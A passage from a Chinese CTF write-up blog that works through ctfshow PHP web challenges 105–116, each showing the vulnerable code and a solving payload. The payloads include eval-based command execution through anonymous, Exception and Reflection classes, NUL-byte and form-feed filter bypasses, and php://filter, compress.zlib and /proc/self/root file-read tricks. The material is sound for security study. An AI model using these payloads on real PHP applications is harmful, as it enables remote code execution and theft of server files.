<p>在get那边，首先<code>$key</code>&#x3D;x,那就有<code>$$key</code>就是<code>$x</code>；<code>$value</code>&#x3D;flag，那就有<code>$$value</code>&#x3D;<code>$flag</code>，经过了get就是<code>$x</code>&#x3D;<code>$flag</code>。<br>在post那边，用相同的方法把左边赋为<code>$error</code>&#x3D;<code>$x</code>就可以了。</p>
<p>第二种是通过suces。flag设置为空，绕过<code>if(!$_POST[&#39;flag&#39;]==$flag)</code>判断。<code>$suces</code>先保存flag变量的值，然后flag设置为空，从而绕过post那里的判断。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?suces=flag&amp;flag=</span><br></pre></td></tr></table></figure>

<p>示例1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Bar</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"> <span class="variable">$Foo</span> = <span class="string">&quot;Bar&quot;</span>;</span><br><span class="line"> <span class="variable">$World</span> = <span class="string">&quot;Foo&quot;</span>;</span><br><span class="line"> <span class="variable">$Hello</span> = <span class="string">&quot;World&quot;</span>;</span><br><span class="line"> <span class="variable">$a</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$a</span>; <span class="comment">//Returns Hello</span></span><br><span class="line"> <span class="variable">$$a</span>; <span class="comment">//Returns World</span></span><br><span class="line"> <span class="variable">$$$a</span>; <span class="comment">//Returns Foo</span></span><br><span class="line"> <span class="variable">$$$$a</span>; <span class="comment">//Returns Bar</span></span><br><span class="line"> <span class="variable">$$$$$a</span>; <span class="comment">//Returns a</span></span><br><span class="line"></span><br><span class="line"> <span class="variable">$$$$$$a</span>; <span class="comment">//Returns Hello</span></span><br><span class="line"> <span class="variable">$$$$$$$a</span>; <span class="comment">//Returns World</span></span><br></pre></td></tr></table></figure>
<p>示例2：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span> = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> <span class="subst">&#123;$$a&#125;</span>&quot;</span>; <span class="comment">// hello world</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> <span class="subst">$hello</span>&quot;</span>; <span class="comment">// hello world</span></span><br></pre></td></tr></table></figure>

<h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><p>和web104相同</p>
<h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]; <span class="comment">// $v1可控，通过POST传递</span></span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]; <span class="comment">// $v3可控，通过GET传递</span></span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>); <span class="comment">// 将输入字符串parse到v2里头</span></span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123; <span class="comment">//松散匹配v2的&#x27;flag&#x27;的值是否和v3的md5值</span></span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很好写解： 其中0cc175b9c0f1b6a831c399e269772661是a的md5散列值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">?v3=a</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">v1=flag=<span class="number">0</span>cc175b9c0f1b6a831c399e269772661</span><br></pre></td></tr></table></figure>

<p>parse_str(string $string, array &amp;$result): void。string是输入的字符串，result在8.0之前是可选参数，表示如果设置了result，变量将会以数组元素的形式存入这个数组。<br>示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 推荐用法</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>, <span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;first&#x27;</span>];  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不建议这么用</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$first</span>;  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123; <span class="comment">//这段 PHP 正则表达式 ^[a-zA-Z]+$ 是用来匹配一个字符串是否只包含英文字母（大小写不敏感）的。其中，^ 表示匹配字符串的开头，$ 表示匹配字符串的结尾，[a-zA-Z] 表示匹配任意一个英文字母（大小写敏感）。+ 表示匹配前面的字符一次或多次，因此 ^[a-zA-Z]+$ 表示匹配一个或多个英文字母组成的字符串</span></span><br><span class="line">	<span class="comment">//也就是说，c不能只包含字母</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123; <span class="comment">//字符串翻转后再取int</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ereg ( string $pattern , string $string [, array &amp;$regs ] ) : int  以区分大小写的方式在 string 中寻找与给定的正则表达式 pattern 所匹配的子串。 ereg在php7.0已经没了。</p>
<blockquote>
<p>如果在 string 中找到 pattern 模式的匹配则返回 所匹配字符串的长度，如果没有找到匹配或出错则返回 FALSE。如果没有传递入可选参数 regs 或者所匹配的字符串长度为 0，则本函数返回 1。如果找到与 pattern 中圆括号内的子模式相匹配的子串并且函数调用给出了第三个参数 regs，则匹配项将被存入 regs 数组中。$regs[1] 包含第一个左圆括号开始的子串，$regs[2] 包含第二个子串，以此类推。$regs[0] 包含整个匹配的字符串。</p>
</blockquote>
<p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。 <strong>ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</strong></p>
<p>strrev(string $string): string 返回 string 反转后的字符串。</p>
<p>首先对<code>0x36d</code>进行strrev转换，得到778，然后直接字符串截断绕过ereg()。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=a%00778</span><br></pre></td></tr></table></figure>

<h1 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有三种方法绕过，一种是PHP匿名类，一种是PHP异常处理类，一种是PHP反射类。</p>
<p>PHP匿名类就是直接弄个匿名类，然后构造函数里任意命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=class&#123; public function __construct()&#123; system(&#x27;ls&#x27;); &#125; &#125;;&amp;v2=a</span><br></pre></td></tr></table></figure>

<p>PHP 异常处理类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="built_in">Exception</span>&amp;v2=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fl36dg.txt&#x27;</span>) </span><br></pre></td></tr></table></figure>
<p>直接用Exception类，构造函数的异常信息设为ls或者cat xxx之类的。</p>
<p>PHP反射类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=Reflectionclass&amp;v2=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fl36dg.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>直接用Reflection，把system()什么东西反射出来。</p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.anonymous.php">PHP 匿名类</a></p>
<p><a target="_blank" rel="noopener" href="https://geek-docs.com/php/php-exception-handling/php-exception-class.html">PHP 异常处理类</a> </p>
<p>Exception类的构造函数定义如下：<code>__construct(&lt;异常信息&gt;, &lt;异常代码&gt;, &lt;前一错误&gt;)</code>，这三个参数都是可选的，作为自己创建的异常对象，我们一般不需要指定后两个参数，但是，如果一个异常一点信息都没有，那怎么知道是出现什么问题了呢？所以，一般我们会指定第一个参数。</p>
<h1 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>几乎都屏蔽完了。一开始想的是PHP无参数RCE，但是没想到该怎么构造。</p>
<p>看wp，说是使用FilesystemIterator，所以使用FilesystemIterator(getcwd())获取该路径下的第一个文件，发现有个fl36dga.txt。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure>
<p>直接访问&#x2F;fl36dga.txt就能获取flag。</p>
<h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>); <span class="comment">//&amp;符号表示引用传递，即$v1和$v2指向同一个内存地址。</span></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>); <span class="comment">// dump出以$v1的值为变量名的变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题需要想到GLOBALS变量。所以?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS。这里的v1是什么都无所谓，只要能过preg_match就行。所以v1&#x3D;ctfshowaaaa之类的都能过。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>

<h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>is_file(string $filename): bool  — 判断给定文件名是否为一个正常的文件。如果是正常文件返回true，否则返回false。</p>
<p>在使用<a target="_blank" rel="noopener" href="https://www.cnblogs.com/meng-han/p/16299548.html">除了file:&#x2F;&#x2F;的php伪协议时</a>，is_file()会返回false。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php://filter/resource=flag.php</span><br><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class="line">php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">compress.zlib://flag.php</span><br></pre></td></tr></table></figure>

<h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><p>这道题比起上一道来说又限制了<code>filter</code>不能出现在payload里。所以除了使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://flag.php</span><br></pre></td></tr></table></figure>
<p>以外，还可以用目录溢出。超出is_file能处理的最大长度，就不认为这是一个文件了。上题也能用这个payload。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>
<p>&#x2F;proc&#x2F;self&#x2F;root是一个符号链接，指向当前进程的根目录。它是用于访问当前进程的根目录，而无需查找进程ID的一种方法</p>
<h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><p>这道题又没有屏蔽filter，直接用112题的payload就行</p>
<h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这道题疑似在考trim()。</p>
<p>trim(string $string, string $characters &#x3D; “ \n\r\t\v\x00”): string — 去除字符串首尾处的空白字符（或者其他字符）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">此函数返回字符串 string 去除首尾空白字符后的结果。如果不指定第二个参数，trim() 将去除这些字符：</span><br><span class="line"></span><br><span class="line">&quot; &quot; (ASCII 32 (0x20))，普通空格符。</span><br><span class="line">&quot;\t&quot; (ASCII 9 (0x09))，制表符。</span><br><span class="line">&quot;\n&quot; (ASCII 10 (0x0A))，换行符。</span><br><span class="line">&quot;\r&quot; (ASCII 13 (0x0D))，回车符。</span><br><span class="line">&quot;\0&quot; (ASCII 0 (0x00))，空字节符。</span><br><span class="line">&quot;\v&quot; (ASCII 11 (0x0B))，垂直制表符。</span><br></pre></td></tr></table></figure>
<p>但是trim()没有去除<code>\f</code>，也就是翻页符。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=%0c36  // %0c是\f</span><br></pre></td></tr></table></figure>

<h2 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h2><p>提示是misc+lfi，然后是一个视频。直接idm把视频弄下来，然后放到binwalk里分析。分析出好些个文件</p>
